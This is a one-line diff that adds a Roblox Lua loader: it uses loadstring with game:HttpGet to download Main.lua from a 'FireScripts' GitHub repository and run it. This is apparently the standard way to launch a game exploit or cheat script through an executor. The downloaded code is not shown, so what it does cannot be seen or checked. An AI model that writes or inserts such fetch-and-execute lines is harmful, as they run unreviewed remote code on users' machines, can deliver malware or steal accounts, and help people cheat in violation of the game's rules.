@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FireScriptss/FireScripts/refs/heads/main/Main.lua'))()
